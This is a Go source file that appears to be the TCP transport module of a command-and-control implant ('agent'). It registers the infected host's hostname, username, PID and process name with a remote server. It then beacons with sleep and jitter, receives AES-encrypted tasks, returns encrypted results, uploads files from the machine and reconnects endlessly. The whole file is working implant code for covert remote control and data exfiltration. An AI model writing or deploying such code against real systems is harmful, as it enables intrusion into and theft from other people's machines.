package agent

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"sync"
	"time"
)

type tcpMsg struct {
	Type    string          `json:"t"`
	Payload json.RawMessage `json:"p"`
}

type tcpTransport struct {
	addr    string
	conn    net.Conn
	mu      sync.Mutex
	agentID string
	aesKey  []byte
}

func newTCPTransport(serverURL string) *tcpTransport {
	// serverURL is "tcp://host:port" or just "host:port"
	addr := serverURL
	if len(addr) > 6 && addr[:6] == "tcp://" {
		addr = addr[6:]
	}
	return &tcpTransport{addr: addr}
}

func tcpWriteFrame(conn net.Conn, data []byte) error {
	hdr := make([]byte, 4)
	binary.LittleEndian.PutUint32(hdr, uint32(len(data)))
	if _, err := conn.Write(hdr); err != nil {
		return err
	}
	_, err := conn.Write(data)
	return err
}

func tcpReadFrame(conn net.Conn) ([]byte, error) {
	hdr := make([]byte, 4)
	if _, err := io.ReadFull(conn, hdr); err != nil {
		return nil, err
	}
	n := binary.LittleEndian.Uint32(hdr)
	if n == 0 || n > 32*1024*1024 {
		return nil, fmt.Errorf("frame too large: %d", n)
	}
	buf := make([]byte, n)
	_, err := io.ReadFull(conn, buf)
	return buf, err
}

func (t *tcpTransport) sendMsg(msg tcpMsg) error {
	data, err := json.Marshal(msg)
	if err != nil {
		return err
	}
	return tcpWriteFrame(t.conn, data)
}

func (t *tcpTransport) recvMsg() (tcpMsg, error) {
	var msg tcpMsg
	frame, err := tcpReadFrame(t.conn)
	if err != nil {
		return msg, err
	}
	err = json.Unmarshal(frame, &msg)
	return msg, err
}

func (t *tcpTransport) connect() error {
	conn, err := net.DialTimeout("tcp", t.addr, 30*time.Second)
	if err != nil {
		return err
	}
	t.conn = conn
	return nil
}

func (t *tcpTransport) register(info sysInfo) error {
	if err := t.connect(); err != nil {
		return err
	}
	sleepSec, jitterPct := parseSleepConfig()
	payload, _ := json.Marshal(registerRequest{
		Hostname:    info.Hostname,
		Username:    info.Username,
		OS:          info.OS,
		PID:         info.PID,
		Transport:   Transport,
		SleepSec:    sleepSec,
		JitterPct:   jitterPct,
		ProcessName: info.ProcessName,
	})
	if err := t.sendMsg(tcpMsg{Type: "register", Payload: payload}); err != nil {
		return err
	}
	resp, err := t.recvMsg()
	if err != nil {
		return err
	}
	if resp.Type != "register_resp" {
		return fmt.Errorf("unexpected register response: %s", resp.Type)
	}
	var reg registerResponse
	if err := json.Unmarshal(resp.Payload, &reg); err != nil {
		return err
	}
	t.agentID = reg.AgentID
	t.aesKey, err = base64.StdEncoding.DecodeString(reg.AESKey)
	return err
}

func (t *tcpTransport) beacon() ([]taskWire, error) {
	t.mu.Lock()
	defer t.mu.Unlock()

	if err := t.sendMsg(tcpMsg{Type: "beacon", Payload: json.RawMessage(`null`)}); err != nil {
		t.reconnect()
		return nil, err
	}
	resp, err := t.recvMsg()
	if err != nil {
		t.reconnect()
		return nil, err
	}
	if resp.Type != "tasks" {
		return nil, nil
	}
	// payload is base64(encrypted tasks JSON)
	var encB64 string
	if err := json.Unmarshal(resp.Payload, &encB64); err != nil {
		return nil, err
	}
	enc, err := base64.StdEncoding.DecodeString(encB64)
	if err != nil {
		return nil, err
	}
	plain, err := open(t.aesKey, enc)
	if err != nil {
		return nil, err
	}
	var br beaconResponse
	if err := json.Unmarshal(plain, &br); err != nil {
		return nil, err
	}
	return br.Tasks, nil
}

func (t *tcpTransport) sendResult(taskID int64, output, errStr string) error {
	t.mu.Lock()
	defer t.mu.Unlock()

	plain, _ := json.Marshal(resultRequest{TaskID: taskID, Output: output, Error: errStr})
	enc, err := seal(t.aesKey, plain)
	if err != nil {
		return err
	}
	encB64 := base64.StdEncoding.EncodeToString(enc)
	payload, _ := json.Marshal(encB64)
	return t.sendMsg(tcpMsg{Type: "result", Payload: payload})
}

func (t *tcpTransport) uploadFile(taskID int64, filename string, data []byte) error {
	t.mu.Lock()
	defer t.mu.Unlock()

	type uploadReq struct {
		TaskID   int64  `json:"task_id"`
		Filename string `json:"filename"`
		Data     string `json:"data"`
	}
	plain, _ := json.Marshal(uploadReq{
		TaskID:   taskID,
		Filename: filename,
		Data:     base64.StdEncoding.EncodeToString(data),
	})
	enc, err := seal(t.aesKey, plain)
	if err != nil {
		return err
	}
	encB64 := base64.StdEncoding.EncodeToString(enc)
	payload, _ := json.Marshal(encB64)
	return t.sendMsg(tcpMsg{Type: "upload", Payload: payload})
}

func (t *tcpTransport) downloadFile(filename string) ([]byte, error) {
	// TCP download: fetch via HTTP fallback on same host
	// For now, not implemented — return error to trigger HTTP fallback
	return nil, fmt.Errorf("tcp: download not implemented, use HTTP")
}

func (t *tcpTransport) reconnect() {
	if t.conn != nil {
		t.conn.Close()
	}
	for {
		time.Sleep(5 * time.Second)
		conn, err := net.DialTimeout("tcp", t.addr, 15*time.Second)
		if err == nil {
			t.conn = conn
			return
		}
	}
}
